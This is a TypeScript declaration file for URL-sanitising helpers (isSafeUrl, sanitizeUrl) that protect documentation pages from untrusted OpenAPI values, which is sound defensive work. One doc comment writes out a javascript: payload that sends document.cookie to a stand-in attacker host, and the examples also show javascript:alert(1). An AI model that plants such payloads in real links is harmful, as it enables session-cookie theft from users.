/**
 * Checks whether a URL is safe to render as a link target.
 *
 * Values that end up in an `href` frequently come from an OpenAPI document, and an OpenAPI document
 * is untrusted input. A document that sets `info.license.url` to
 * `javascript:fetch('https://evil.example/?c=' + document.cookie)` would otherwise render a link
 * that runs script in the context of the documentation page.
 *
 * @example
 * isSafeUrl('https://example.com') // true
 * isSafeUrl('/openapi.json') // true (relative)
 * isSafeUrl('javascript:alert(1)') // false
 */
export declare const isSafeUrl: (url: string | null | undefined) => url is string;
/**
 * Returns the URL when it is safe to render as a link target, and `undefined` otherwise.
 *
 * Use this to drop the `href` (and ideally the whole link) instead of rendering an attacker
 * controlled protocol.
 *
 * @example
 * sanitizeUrl('https://example.com') // 'https://example.com'
 * sanitizeUrl('javascript:alert(1)') // undefined
 */
export declare const sanitizeUrl: (url: string | null | undefined) => string | undefined;
//# sourceMappingURL=is-safe-url.d.ts.map